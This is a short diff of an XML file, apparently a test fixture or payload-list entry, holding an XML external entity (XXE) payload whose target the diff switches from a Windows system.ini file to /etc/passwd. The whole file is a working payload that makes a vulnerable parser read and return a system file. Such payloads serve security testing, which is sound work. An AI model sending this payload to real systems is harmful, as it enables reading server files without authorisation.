@@ -1,4 +1,4 @@
 <?xml version="1.0"?>
 <!DOCTYPE xxe [
 <!ELEMENT xxe ANY >
-<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini" >]><xxe>&xxe;</xxe>
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><xxe>&xxe;</xxe>
